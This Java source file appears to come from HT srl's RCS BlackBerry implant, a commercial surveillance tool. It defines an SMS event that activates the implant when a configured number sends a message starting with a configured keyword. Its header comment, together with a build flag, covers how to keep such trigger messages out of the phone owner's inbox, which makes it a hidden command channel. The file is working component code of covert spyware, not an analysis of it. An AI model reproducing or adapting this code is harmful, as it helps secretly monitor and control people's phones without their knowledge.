//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SmsEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.MessageConnection;

import blackberry.agent.sms.SmsListener;
import blackberry.agent.sms.SmsListener45;
import blackberry.agent.sms.SmsListener46;
import blackberry.config.ConfEvent;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.SmsObserver;

/**
 * To prevent this message from appearing in the BlackBerry device user’s inbox,
 * the sending server should configure the SMS message so that the message type
 * is a system message. This message type can be defined by setting the Protocol
 * Identifier (TP-PID) to 64 (0x40), and the Digital Coding Scheme (TP-DCS) to
 * 244 (0xF4), as shown below: 07913180998000F0040491369740F43080224100238
 * A1168656C6C6F62696E61727974706964363
 * http://www.blackberry.com/knowledgecenterpublic/livelink.exe/fetch/2000/
 * 348583
 * /796557/800451/800563/How_To_-_Use_SMS_to_notify_an_application.html?nodeid
 * =1266974&vernum=0
 * 
 * @author user1
 */
public final class EventSms extends Event implements SmsObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("SmsEvent", DebugLevel.VERBOSE);
    //#endif

    String number;
    String msg;

    SmsListener smsListener;

    // private final boolean stop = false;
    private DatagramConnection dc;
    MessageConnection mc;

    /**
     * Instantiates a new sms event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public EventSms() {
        super();
        setPeriod(NEVER);

        //#ifdef SMS_HIDE
        smsListener = SmsListener46.getInstance();
        //#else
        smsListener = SmsListener45.getInstance();
        //#endif
    }

    public boolean parse(ConfEvent conf) {
        try {
            number = conf.getString("number");
            msg = conf.getString("text").toLowerCase();

        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.trace(" Error: params FAILED");//$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

    protected void actualStart() {
        smsListener.addSmsObserver(this, number, msg);
    }

    public void actualGo() {
        // TODO Auto-generated method stub
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public synchronized void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop");
        //#endif

        smsListener.removeSmsObserver(this);
        onExit();
    }

    public boolean onNewSms(byte[] dataMsg, String address, boolean incoming) {

        String text = (new String(dataMsg)).toLowerCase();

        if (incoming && address.toLowerCase().endsWith(number)) {
            //#ifdef DEBUG
            debug.trace("notifyIncomingMessage: good number " + address);
            //#endif

            // case insensitive
            if (msg == null || text.toLowerCase().startsWith(msg)) {
                //#ifdef DEBUG
                debug.trace("notifyIncomingMessage good message: " + msg);
                //#endif

                onEnter();
                return true;
            }
        }

        return false;

    }

}
